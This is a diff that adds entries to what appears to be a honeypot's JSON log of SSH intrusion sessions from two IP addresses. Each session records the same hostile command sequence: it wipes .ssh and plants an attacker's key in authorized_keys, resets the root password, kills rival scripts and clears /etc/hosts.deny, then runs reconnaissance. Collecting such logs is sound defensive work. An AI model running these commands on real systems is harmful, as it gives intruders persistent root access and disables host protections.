@@ -32595,6 +32595,262 @@
             "session": "a328785ab279"
         }
     ],
+    "113.125.140.222": [
+        {
+            "timestamp": "2023-11-15T19:32:35.486722Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:32:36.169567Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:32:36.361084Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:00.638823Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep name | wc -l",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:01.231817Z",
+            "event": "command_input",
+            "input": "echo \"root:dRKPl0HRF6Fd\"|chpasswd|bash",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:01.909943Z",
+            "event": "command_input",
+            "input": "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:02.102556Z",
+            "event": "file_download",
+            "details": "File downloaded: /etc/hosts.deny (SHA-256: 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b)",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:02.546446Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:03.149124Z",
+            "event": "command_input",
+            "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:03.835233Z",
+            "event": "command_input",
+            "input": "ls -lh $(which ls)",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:03.835572Z",
+            "event": "command_input",
+            "input": "which ls",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:04.429638Z",
+            "event": "command_input",
+            "input": "crontab -l",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:05.100253Z",
+            "event": "command_input",
+            "input": "w",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:05.743025Z",
+            "event": "command_input",
+            "input": "uname -m",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:06.336356Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:07.006183Z",
+            "event": "command_input",
+            "input": "top",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:07.609898Z",
+            "event": "command_input",
+            "input": "uname",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:08.289178Z",
+            "event": "command_input",
+            "input": "uname -a",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:08.930950Z",
+            "event": "command_input",
+            "input": "whoami",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:09.534424Z",
+            "event": "command_input",
+            "input": "lscpu | grep Model",
+            "session": "fa341bbfdfab"
+        },
+        {
+            "timestamp": "2023-11-15T19:33:10.221051Z",
+            "event": "command_input",
+            "input": "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
+            "session": "fa341bbfdfab"
+        }
+    ],
+    "124.223.12.24": [
+        {
+            "timestamp": "2023-11-15T19:34:19.175661Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:19.750802Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:19.908135Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:44.147069Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep name | wc -l",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:44.640922Z",
+            "event": "command_input",
+            "input": "echo \"root:rCtR97grY5sC\"|chpasswd|bash",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:45.216289Z",
+            "event": "command_input",
+            "input": "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:45.375380Z",
+            "event": "file_download",
+            "details": "File downloaded: /etc/hosts.deny (SHA-256: 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b)",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:45.707730Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:46.276661Z",
+            "event": "command_input",
+            "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:46.827451Z",
+            "event": "command_input",
+            "input": "ls -lh $(which ls)",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:46.827768Z",
+            "event": "command_input",
+            "input": "which ls",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:47.322074Z",
+            "event": "command_input",
+            "input": "crontab -l",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:47.891952Z",
+            "event": "command_input",
+            "input": "w",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:48.422708Z",
+            "event": "command_input",
+            "input": "uname -m",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:48.914557Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:49.499926Z",
+            "event": "command_input",
+            "input": "top",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:49.993141Z",
+            "event": "command_input",
+            "input": "uname",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:50.566671Z",
+            "event": "command_input",
+            "input": "uname -a",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:51.093080Z",
+            "event": "command_input",
+            "input": "whoami",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:51.584800Z",
+            "event": "command_input",
+            "input": "lscpu | grep Model",
+            "session": "b2f9d5d29e8d"
+        },
+        {
+            "timestamp": "2023-11-15T19:34:52.166662Z",
+            "event": "command_input",
+            "input": "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
+            "session": "b2f9d5d29e8d"
+        }
+    ],
     "189.112.0.11": [
         {
             "timestamp": "2023-11-11T01:06:14.632110Z",
